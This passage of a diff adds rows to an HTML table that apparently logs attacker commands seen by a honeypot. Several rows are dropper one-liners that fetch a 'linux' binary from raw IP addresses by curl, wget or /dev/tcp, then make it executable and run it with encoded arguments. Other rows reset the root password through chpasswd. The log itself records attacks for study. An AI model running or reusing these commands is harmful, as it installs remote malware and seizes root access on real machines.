t6NRIX0Cjc/gN+XPjgV/NV+zy8uySTt4Ho3U5S7g04kedjZTtcrLs1kveweR0+Uy/9OMBWE+WbXAzLNYPnkQi9b/MuLXkQJ7Nke7y8C1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OKAmE+WK3MyrlfP34CicHlN//TjAlhN1mty8uwUzl/AYzR8TTmz40DeSFbs9TOulM5fwGN0fEx6NORA2E2W63CzblfP34Ai8HlN//TjAdhPlux1Mu2XDV5AI7T6SDl1pECfDZHt8jUsVg7dQaP0OMz8dWIHnc5R7LNza1YO3oKidHgMOLBiwdhN1qtyMqwRz53A4XX4THi2Z8EeCFbsM3UsFkhfgCI2+cw4NONEHs4R7HJza1ROWEBh9frNuHQiwdvPlmy1MuxXyF+BpHT4Dbr148BfDhJt83UsV08YQGN1v8x5dGFBn8+XbDayLNeIX4Ij8/jMePPjgZ1OVmyzsmjXThhAovS/zHj1pEBez9TtcrLt1ovfgCOz+Ay58+OBmE9WLXAzLNYPHgQi9b/MuLYkQR9IVuyzsC1WT59A5/V5i7j0ogedz9Hss7KuV8/fgKJweU3/9OMCWE3Wa3Ly7BTOX8BjNHxNObPjQN5IVuz1M66Uzl/AY3R8TTmz40DeCFYscjUslw6dQaP0OM48deJHn0/X63Jw61dPXUGj9DhM/HViB59O1utyMm2Rz5/BoXX4THg158Bdj1HsNTDsUc3eAqJ0eAw5cGLB2E9WrXUyLdQIXcBhdfhMePSnwR9IVi6ztSyXT5hAovT6zbh0I0Bo5/QGLu0ZWn54CiI2oT0F7kcWQgb" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 3610344 > /tmp/q7lqdFpJSp</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:FZZ51hEgqjqg"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>nohup $SHELL -c "curl http://47.254.126.99:60100/linux -o /tmp/QHgdhFujzD; if [ ! -f /tmp/QHgdhFujzD ]; then wget http://47.254.126.99:60100/linux -O /tmp/QHgdhFujzD; fi; if [ ! -f /tmp/QHgdhFujzD ]; then exec 6<>/dev/tcp/47.254.126.99/60100 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/QHgdhFujzD ; chmod +x /tmp/QHgdhFujzD && /tmp/QHgdhFujzD ssYBGdR4f84ABNTJ0d8MFMx6e8oeFd7RzdQHAMt9ftQfANbFydYEH8tqctQcBN/RztMEAMt8fcAYBdfLy8YBGdR4fskABNTI0dcBHsB8essaBsbLyMgHG8hkec8ADNbFydYEHM1qctQcBNHRzdcbH81/cMweBNbG39ICAMJ8ZMsZA8jKz9wDHst+f9oaAsjNzN8bFspke8sdD9DPztUFDsJkeMseG9PP0dAAFMx6e8gYFdfGzcgGAMN4ZMIZD9DPztYBDsx8ZMgeA8jMxsgBHMB8esseBsbH0dcBHtR4ec4ABNXJxdAFH8p/as4ZG9HJ0dADAMh7cMweBNbJ39ICAMh+edQcBsjMx9wDHst5fdoaAsjNzNEbFsxke8IYD9DPztICDs59ZMgdA8jNy9UbH855cMweBNbN39ICAMh5c9QfBdXRx9wDHst+etoaAsjNy9QbH8xkeMoUA9bOy9IVGs1kcskAB9bG0d4MFMx6e8kfFdXJ0dcGGtR7c84ABN/FydYEGs1qfs0ADdXRzdYMAMt6c8AYBdfPz8YNAMh7ctQfB9PRzdYHFMx6e84ZFdTOzsgEGsNke8weG9TOy9wDHst+ctoaAsjNytQbH8tkfMoUA9bOzdAVGs1keMkZG9XP0dcFGcB8esscB8bLyMgEH8tke8gbG9PNxdAFH8h+as4ZG97M0dcHGtR7eMsUA9bOz9MVH8p7ZMscA8jOycgHH8xwfMofBtHfy9EbHMl8ZMgeG9LGxdAFH8h6lkiMtAS/9f6aua5pMj4=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/QHgdhFujzD && /tmp/QHgdhFujzD ssYBGdR4f84ABNTJ0d8MFMx6e8oeFd7RzdQHAMt9ftQfANbFydYEH8tqctQcBN/RztMEAMt8fcAYBdfLy8YBGdR4fskABNTI0dcBHsB8essaBsbLyMgHG8hkec8ADNbFydYEHM1qctQcBNHRzdcbH81/cMweBNbG39ICAMJ8ZMsZA8jKz9wDHst+f9oaAsjNzN8bFspke8sdD9DPztUFDsJkeMseG9PP0dAAFMx6e8gYFdfGzcgGAMN4ZMIZD9DPztYBDsx8ZMgeA8jMxsgBHMB8esseBsbH0dcBHtR4ec4ABNXJxdAFH8p/as4ZG9HJ0dADAMh7cMweBNbJ39ICAMh+edQcBsjMx9wDHst5fdoaAsjNzNEbFsxke8IYD9DPztICDs59ZMgdA8jNy9UbH855cMweBNbN39ICAMh5c9QfBdXRx9wDHst+etoaAsjNy9QbH8xkeMoUA9bOy9IVGs1kcskAB9bG0d4MFMx6e8kfFdXJ0dcGGtR7c84ABN/FydYEGs1qfs0ADdXRzdYMAMt6c8AYBdfPz8YNAMh7ctQfB9PRzdYHFMx6e84ZFdTOzsgEGsNke8weG9TOy9wDHst+ctoaAsjNytQbH8tkfMoUA9bOzdAVGs1keMkZG9XP0dcFGcB8esscB8bLyMgEH8tke8gbG9PNxdAFH8h+as4ZG97M0dcHGtR7eMsUA9bOz9MVH8p7ZMscA8jOycgHH8xwfMofBtHfy9EbHMl8ZMgeG9LGxdAFH8h6lkiMtAS/9f6aua5pMj4=" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 0 > /tmp/1PLVmyNT2b</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>nohup $SHELL -c "curl http://101.126.16.216:60137/linux -o /tmp/ooBUGej3Hr; if [ ! -f /tmp/ooBUGej3Hr ]; then wget http://101.126.16.216:60137/linux -O /tmp/ooBUGej3Hr; fi; if [ ! -f /tmp/ooBUGej3Hr ]; then exec 6<>/dev/tcp/101.126.16.216/60137 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/ooBUGej3Hr ; chmod +x /tmp/ooBUGej3Hr && /tmp/ooBUGej3Hr A4wQoz2Qa7/kCmMBh1nj6VqGHmYM9aVujD24HIJ/fJoGtDaYb6HkDWcPglv94V+AAWUN+6VgmDm9GZ5+bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9al3kzu8BpV7YJ0QvDWUaaDnCncbgULh4FuYF2cT5KVpmDm9GZ54bpgfoz2Rb7/nCWQBh1jg6VqGHmcP9ahrjD68EIJ8fZkGvz2aY6flDGYell3k5kKAAWQP+6NolzW7GJ1+e4wcuiGQaqb7DmcBh1zk6VqGHmUP9aVujD24GoJ9e4IRvTWUaaDnCncej1794EKPHXkF4qtvkj69HIx8fp4GuDqMYaP7D2IfjFrj4liGD28T5KJqjDyjGp55dJoYvDuTeaDlDHkehFr94lqYHWYL76dpkzy6CJh5YJseoz6Rab/sC20Zhl3j5EyCGHkP4KN3lTajHpx0eJwZvzaCbab7BWEBh1vl/VmGFWEN5KVsgju6Bp59doIavzuMYKHvC2cehF7z60KEHm8T4al3kD21Epp+f5gbrTuVd6bjE2EYmF/i6VqGHmcM9al3kzy1Bp18fIIZuT6Yb6HkCWMPglv94VmEAWQI+6hpmDm9GZ55bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9aBulyG5GoJ9fYIZuzyYb6HkCWUPglv94VmEAWAE+6dpmDm9GZ53bp4YvyGXbL/tD3kdg1zp5VyHG2cd4aZ3kDu+Bp59YJ8QtzmSaKLiHW4dmF3i60KEHGIT56NhmDm9GZ1/bpgfoz2Rbr/tDXkeglzp5VyHHWEASjNBWwXVr8Cfaz17DdwPYc0SPKIVPoynVMwb5k5MUg==; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/ooBUGej3Hr && /tmp/ooBUGej3Hr A4wQoz2Qa7/kCmMBh1nj6VqGHmYM9aVujD24HIJ/fJoGtDaYb6HkDWcPglv94V+AAWUN+6VgmDm9GZ5+bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9al3kzu8BpV7YJ0QvDWUaaDnCncbgULh4FuYF2cT5KVpmDm9GZ54bpgfoz2Rb7/nCWQBh1jg6VqGHmcP9ahrjD68EIJ8fZkGvz2aY6flDGYell3k5kKAAWQP+6NolzW7GJ1+e4wcuiGQaqb7DmcBh1zk6VqGHmUP9aVujD24GoJ9e4IRvTWUaaDnCncej1794EKPHXkF4qtvkj69HIx8fp4GuDqMYaP7D2IfjFrj4liGD28T5KJqjDyjGp55dJoYvDuTeaDlDHkehFr94lqYHWYL76dpkzy6CJh5YJseoz6Rab/sC20Zhl3j5EyCGHkP4KN3lTajHpx0eJwZvzaCbab7BWEBh1vl/VmGFWEN5KVsgju6Bp59doIavzuMYKHvC2cehF7z60KEHm8T4al3kD21Epp+f5gbrTuVd6bjE2EYmF/i6VqGHmcM9al3kzy1Bp18fIIZuT6Yb6HkCWMPglv94VmEAWQI+6hpmDm9GZ55bpgfoz2Rbr/kD2UBh1nm6VqGHmUF9aBulyG5GoJ9fYIZuzyYb6HkCWUPglv94VmEAWAE+6dpmDm9GZ53bp4YvyGXbL/tD3kdg1zp5VyHG2cd4aZ3kDu+Bp59YJ8QtzmSaKLiHW4dmF3i60KEHGIT56NhmDm9GZ1/bpgfoz2Rbr/tDXkeglzp5VyHHWEASjNBWwXVr8Cfaz17DdwPYc0SPKIVPoynVMwb5k5MUg==" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 3610344 > /tmp/xjK8DtCyQi</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:L4uC6qgRFrfP"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:4hfaTm2Tuwlj"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>echo "root:yDuKYYd4Fy0N"|chpasswd|bash</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>nohup $SHELL -c "curl http://47.237.122.155:60128/linux -o /tmp/1T7UogF0gg; if [ ! -f /tmp/1T7UogF0gg ]; then wget http://47.237.122.155:60128/linux -O /tmp/1T7UogF0gg; fi; if [ ! -f /tmp/1T7UogF0gg ]; then exec 6<>/dev/tcp/47.237.122.155/60128 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/1T7UogF0gg ; chmod +x /tmp/1T7UogF0gg && /tmp/1T7UogF0gg jUCbyxMj8l0fYDJnH1D+KwvMnlD87FiBzg8j6VgGZS5gBFn9Jw3NnlHs/lCd0ggk6VEDfzJkAVPxIQzIn0D+/FOByQo/9VoEfzJkBVPxIQzOmED4+06dzwQ/9lkCfzhrB1n2JQ3cm1fi/lSc0g8i6VoJazZhAFrwMQzOn0749E6eyQo/8lkLZzBgBVHnJQrSllji9VmBzQgo/V8BYDBlEV3wPwXIgVH1+06dyQ8r8VkAYjVxBV7pIwnPgVP54lOYxgsh9l0GcTRmH1vyIxPNnk76/FqZzAwj8UkFZi5gAFzpJgvSmFL2+lCezwgx814fYzRiH1j1JhPNm1D2+lCeyA4x814fYzNmH1j1IxPNmlX2+lCezgUx814fYzNoH1jzJRPOnlf2+lCezAwx814faDl/CFHpIAzJlVb8/VOc3Akm6VsEZS5nCEf2Ig7GmVD9/1WPyAo/9VoIfzRjH1v2JQfKn1H+/0CbyxMj9F4fYDJjH1jyJAfKn1H+9ECbyxMm8UcHZy5jAFPxIQzMmUD4+06XzxMj91ofYDhiC1/3IA7Ej1ji/lGf0ggh6V8EazZhAFvxMQnLgVf64laY0g4g/V8BYDBgEVj1IBPInk71+U6byQcn91gFYCBlBkf1IgTSm1Li/lGbxgsh9lsCcTRmH1v0KRPNmVTi+FOVyg0g9VoRaS5jAFnpIwnKgVn2+lCezQgx/0cDYDl/A1n+PwzLn1r6/FGdzB0g9VofZDd/AF/xPwzLm1r6/FGexB0p6VsAaS5gA1zpIw3OlVb8/VSYLQG4uSBRSLQI21aKOd2PQB1FF2HhSVw=; fi; echo 12345678 > /tmp/.opass; chmod +x /tmp/1T7UogF0gg && /tmp/1T7UogF0gg jUCbyxMj8l0fYDJnH1D+KwvMnlD87FiBzg8j6VgGZS5gBFn9Jw3NnlHs/lCd0ggk6VEDfzJkAVPxIQzIn0D+/FOByQo/9VoEfzJkBVPxIQzOmED4+06dzwQ/9lkCfzhrB1n2JQ3cm1fi/lSc0g8i6VoJazZhAFrwMQzOn0749E6eyQo/8lkLZzBgBVHnJQrSllji9VmBzQgo/V8BYDBlEV3wPwXIgVH1+06dyQ8r8VkAYjVxBV7pIwnPgVP54lOYxgsh9l0GcTRmH1vyIxPNnk76/FqZzAwj8UkFZi5gAFzpJgvSmFL2+lCezwgx814fYzRiH1j1JhPNm1D2+lCeyA4x814fYzNmH1j1IxPNmlX2+lCezgUx814fYzNoH1jzJRPOnlf2+lCezAwx814faDl/CFHpIAzJlVb8/VOc3Akm6VsEZS5nCEf2Ig7GmVD9/1WPyAo/9VoIfzRjH1v2JQfKn1H+/0CbyxMj9F4fYDJjH1jyJAfKn1H+9ECbyxMm8UcHZy5jAFPxIQzMmUD4+06XzxMj91ofYDhiC1/3IA7Ej1ji/lGf0ggh6V8EazZhAFvxMQnLgVf64laY0g4g/V8BYDBgEVj1IBPInk71+U6byQcn91gFYCBlBkf1IgTSm1Li/lGbxgsh9lsCcTRmH1v0KRPNmVTi+FOVyg0g9VoRaS5jAFnpIwnKgVn2+lCezQgx/0cDYDl/A1n+PwzLn1r6/FGdzB0g9VofZDd/AF/xPwzLm1r6/FGexB0p6VsAaS5gA1zpIw3OlVb8/VSYLQG4uSBRSLQI21aKOd2PQB1FF2HhSVw=" &</code></td>
+                                        <td>1</td>
+                                    </tr>
+                                    
+                                    <tr>
+                                        <td><code>head -c 3631236 > /tmp/yILm2suPl6</code></td>
                                         <td>1</td>
                                     </tr>
                                     
